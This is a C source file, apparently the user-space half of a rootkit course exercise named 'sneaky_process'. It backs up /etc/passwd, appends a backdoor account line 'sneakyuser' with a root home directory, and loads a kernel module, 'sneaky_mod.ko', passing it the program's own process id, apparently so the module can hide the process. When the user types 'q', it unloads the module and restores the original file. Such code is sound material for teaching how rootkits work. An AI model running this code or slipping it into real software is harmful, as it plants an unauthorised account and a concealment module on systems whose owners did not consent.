#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void copyFile(const char * src, const char * dest) {
  if (src == NULL || dest == NULL) {
    exit(-1);
  }

  FILE * srcFile = fopen(src, "r");
  if (srcFile == NULL) {
    printf("Could not open file %s.\n", src);
    exit(-1);
  }

  FILE * destFile = fopen(dest, "w+");
  if (destFile == NULL) {
    printf("Could not open file %s.\n", dest);
    fclose(srcFile);
    exit(-1);
  }
  
  char c;
  while ((c = fgetc(srcFile)) != -1) {
    fputc(c, destFile);
  }

  fclose(destFile);
  fclose(srcFile);
}

void insertLine(const char * dest, const char * line) {
  if (dest == NULL || line == NULL) {
    exit(-1);
  }

  FILE * destFile = fopen(dest, "a");
  if (destFile == NULL) {
    printf("Could not open file %s.\n", dest);
    exit(-1);
  }

  while (*line != '\0') {
    fputc(*line, destFile);
    ++line;
  }

  fclose(destFile);
}


int main() {
  // 1. print process id
  printf("sneaky_process pid = %d\n", getpid());

  // 2. copy file from /etc/passwd to /tmp/passwd
  copyFile("/etc/passwd", "/tmp/passwd");

  // 3. insert a line to the /etc/passwd
  insertLine("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");

  // 4. load the sneaky_mod
  char args[64];
  sprintf(args, "insmod sneaky_mod.ko sneaky_pid=%d", (int) getpid());
  system(args);

  // 5. loop
  char c;
  while ((c = getchar()) != 'q') {
    // empty
  }

  // 6. unload the sneaky_mod
  system("rmmod sneaky_mod.ko");

  // 7. copy file from /tmp/passwd to /etc/passwd
  copyFile("/tmp/passwd", "/etc/passwd");

  // 8. remove /tmp/passwd
  system("rm -f /tmp/passwd");
  
  return 0;
}
